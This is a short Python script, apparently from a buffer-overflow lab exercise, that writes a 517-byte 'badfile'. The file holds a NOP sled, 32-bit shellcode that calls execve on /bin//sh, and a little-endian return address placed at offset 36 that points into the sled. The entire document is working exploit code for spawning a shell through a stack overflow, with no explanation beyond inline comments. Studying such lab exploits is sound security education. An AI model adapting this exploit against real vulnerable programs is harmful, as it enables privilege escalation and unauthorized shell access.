#!/usr/bin/env python3
import sys

# 1. Base Address (from your stack_debug finding)
base_addr = 0xffffcb08

# 2. Target Address (Middle of buffer)
# We land in the middle of a NOP spray
ret = base_addr + 200

# 3. NEW SHELLCODE (Clears EDX register)
# The instruction \x31\xd2 (xor edx, edx) is crucial here.
shellcode = (
    b"\x31\xc0"             # xor eax, eax    (Clear EAX)
    b"\x50"                 # push eax        (Push NULL)
    b"\x68\x2f\x2f\x73\x68" # push "//sh"     (Push string)
    b"\x68\x2f\x62\x69\x6e" # push "/bin"     (Push string)
    b"\x89\xe3"             # mov ebx, esp    (EBX = ptr to /bin//sh)
    b"\x50"                 # push eax        (Push NULL)
    b"\x53"                 # push ebx        (Push ptr to string)
    b"\x89\xe1"             # mov ecx, esp    (ECX = argv)
    b"\x31\xd2"             # xor edx, edx    (EDX = 0) <--- THIS FIXES IT
    b"\xb0\x0b"             # mov al, 11      (Syscall execve)
    b"\xcd\x80"             # int 0x80        (Trigger syscall)
)

# 4. Fill the whole buffer with NOPs
content = bytearray(0x90 for i in range(517))

# 5. Put shellcode at the very end
start = 517 - len(shellcode)
content[start:] = shellcode

# 6. Overwrite Return Address at Offset 36
offset = 36
content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print("[+] Exploit created with EDX-clearing shellcode.")
